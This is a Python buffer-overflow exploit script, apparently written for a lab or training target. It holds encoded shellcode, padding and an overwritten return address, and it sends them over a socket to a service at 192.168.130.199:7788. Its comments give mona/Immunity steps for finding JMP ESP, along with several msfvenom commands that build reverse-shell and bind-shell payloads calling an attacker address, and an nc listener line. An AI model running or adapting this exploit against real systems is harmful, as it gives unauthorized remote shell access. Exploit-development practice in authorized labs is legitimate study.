#!/usr/bin/python
import sys, socket

#mona
#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
#JMP ESP 


#!mona modules 

#!mona find -s "\xff\xe4" -m modules_found

#copy the return address 

#search the return addr in immunity with blue button, check id it match with jmp esp code (ffe4) 
#and set a break point with f2. Run again the progam and check if EIP was really rewritten


#return address 62 50 11 AF => \xaf\x11\x50\x62
#return address 0x625011bb

#common bad char "\x00\x0A\x0D"

#shell
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.130.1 LPORT=1234 EXITFUNC=thread -f c -a x86 -b "\x00" -e x86/shikata_ga_nai

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.130.1 LPORT=4444 EXITFUNC=thread -e x86/alpha_upper -b "\x00\x0A\x0D" -f c
#msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.0.51 LPORT=1234 EXITFUNC=thread -f c -a x86 --platform linux -b "\x00" -e x86/shikata_ga_nai

#msfvenom -p windows/shell_bind_tcp LPORT=1234 -e x86/shikata_ga_nai -b '\x00\x0A\x0D' -i 3 -f python

#nc -nv 192.168.1.11 1234

buf =  b""
buf += b"\xbd\xf4\x8f\xe4\xdc\xd9\xe5\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x12\x31\x6a\x12\x03\x6a\x12\x83\x36\x8b\x06"
buf += b"\x29\x87\x4f\x31\x31\xb4\x2c\xed\xdc\x38\x3a\xf0\x91"
buf += b"\x5a\xf1\x73\x42\xfb\xb9\x4b\xa8\x7b\xf0\xca\xcb\x13"
buf += b"\xc3\x85\xae\xe2\xab\xd7\xae\xf5\x77\x51\x4f\x45\xe1"
buf += b"\x31\xc1\xf6\x5d\xb2\x68\x19\x6c\x35\x38\xb1\x01\x19"
buf += b"\xce\x29\xb6\x4a\x1f\xcb\x2f\x1c\xbc\x59\xe3\x97\xa2"
buf += b"\xed\x08\x65\xa4"

#print "lengh of pwn = "+str(len(pwn))
#08 04 85 63
shellcode=buf+"A"*(168-len(buf)) + "\x63\x85\x04\x08\n" 
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.130.199',7788)) 
p=s.recv(4048)
#print p
s.send("48093572\n") 
p=s.recv(1024)
#print p
s.send("3\n") 
p=s.recv(1024)

try:
	s.send((shellcode)) 

	s.close()

except:

	print "Error connecting to the server" 
	sys.exit()


